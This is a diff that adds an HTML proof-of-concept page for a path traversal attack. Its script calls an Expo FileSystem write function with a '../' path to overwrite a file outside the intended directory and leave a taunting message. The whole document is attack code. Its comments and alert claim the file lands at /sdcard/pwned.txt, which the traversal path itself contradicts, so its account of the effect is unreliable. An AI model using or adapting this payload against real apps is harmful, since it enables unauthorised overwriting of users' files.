@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head><title>Path Traversal PoC</title></head>
+<body>
+<script>
+// Expo FileSystem API call via JS (React Native bridge)
+// Write evil data ke temp file, tapi traversal ke arbitrary path
+const evilPath = "file:///sdcard/../pwned.txt";  // Traversal ke /sdcard/pwned.txt
+const evilData = "Hacked! Your data is mine.";
+
+// Call Expo FileSystem.writeAsStringAsync
+ExpoFileSystem.writeAsStringAsync(evilPath, evilData, { encoding: 'utf8' })
+  .then(() => {
+    alert('Success! File overwritten at /sdcard/pwned.txt');
+    console.log('Arbitrary write succeeded!');
+  })
+  .catch(err => {
+    alert('Error: ' + err.message);
+    console.log('Error:', err);
+  });
+</script>
+</body>
+</html>
